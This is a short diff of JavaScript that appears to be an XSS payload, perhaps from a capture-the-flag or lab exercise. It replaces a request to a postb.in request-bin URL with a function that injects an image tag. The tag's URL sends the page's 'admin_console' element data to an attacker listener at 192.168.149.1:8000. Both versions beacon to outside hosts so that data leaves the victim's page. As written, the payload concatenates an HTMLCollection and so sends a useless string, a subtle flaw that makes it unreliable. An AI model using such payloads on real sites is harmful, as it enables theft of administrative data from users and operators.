@@ -1,2 +1,6 @@
-xhttp.open("GET", "https://postb.in/1585544843520-9398722795303", true);
-xhttp.send();
+function addTheImage() {
+    var img = document.createElement('img');
+    img.src = "http://192.168.149.1:8000/index.php?c="+document.getElementsByClassName("col-8 admin_console");
+    document.body.appendChild(img);
+}
+addTheImage();
